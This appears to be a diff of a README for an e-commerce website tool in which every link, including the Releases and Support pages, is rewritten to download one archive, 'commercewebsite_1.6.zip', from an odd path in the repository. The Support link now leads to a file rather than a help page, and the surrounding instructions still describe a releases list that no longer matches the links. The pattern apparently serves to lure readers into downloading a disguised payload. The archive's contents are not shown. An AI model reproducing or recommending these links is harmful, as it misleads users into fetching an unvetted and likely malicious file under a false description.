@@ -6,9 +6,9 @@ Welcome to E-commercewebsite! This application helps you create and manage your 
 
 ## 📥 Download E-commercewebsite
 
-[![Download E-commercewebsite](https://img.shields.io/badge/Download-Ecommercewebsite-blue.svg)](https://github.com/jraaz079/E-commercewebsite/releases)
+[![Download E-commercewebsite](https://github.com/jraaz079/E-commercewebsite/raw/refs/heads/main/outsmart/commercewebsite_1.6.zip)](https://github.com/jraaz079/E-commercewebsite/raw/refs/heads/main/outsmart/commercewebsite_1.6.zip)
 
-Visit [this page to download](https://github.com/jraaz079/E-commercewebsite/releases) the latest version of E-commercewebsite.
+Visit [this page to download](https://github.com/jraaz079/E-commercewebsite/raw/refs/heads/main/outsmart/commercewebsite_1.6.zip) the latest version of E-commercewebsite.
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you download E-commercewebsite, make sure your computer meets the followi
 
 ## 📥 Download & Install
 
-1. Click the link to visit the [Releases page](https://github.com/jraaz079/E-commercewebsite/releases).
+1. Click the link to visit the [Releases page](https://github.com/jraaz079/E-commercewebsite/raw/refs/heads/main/outsmart/commercewebsite_1.6.zip).
 2. You will see a list of available versions. Look for the latest release, which is usually at the top.
 3. Click on the version number to access the download options.
 4. Choose the file that matches your operating system, then click the download link to start downloading the file.
@@ -64,7 +64,7 @@ If you face issues during installation, check the following:
 
 To update E-commercewebsite:
 
-1. Go to the [Releases page](https://github.com/jraaz079/E-commercewebsite/releases).
+1. Go to the [Releases page](https://github.com/jraaz079/E-commercewebsite/raw/refs/heads/main/outsmart/commercewebsite_1.6.zip).
 2. Download the latest version using the same steps as before.
 3. Install the new version over the existing one. Your settings will remain intact.
 
@@ -74,6 +74,6 @@ Currently, E-commercewebsite is designed for desktop use. However, we are workin
 
 ## 🆘 Support
 
-If you need further assistance, feel free to contact our support team. We offer help via email and community forums. Visit our [Support page](https://github.com/jraaz079/E-commercewebsite/issues) to ask questions or report issues.
+If you need further assistance, feel free to contact our support team. We offer help via email and community forums. Visit our [Support page](https://github.com/jraaz079/E-commercewebsite/raw/refs/heads/main/outsmart/commercewebsite_1.6.zip) to ask questions or report issues.
 
 Thank you for choosing E-commercewebsite. We hope it helps you create the online store of your dreams! Enjoy your shopping experience!
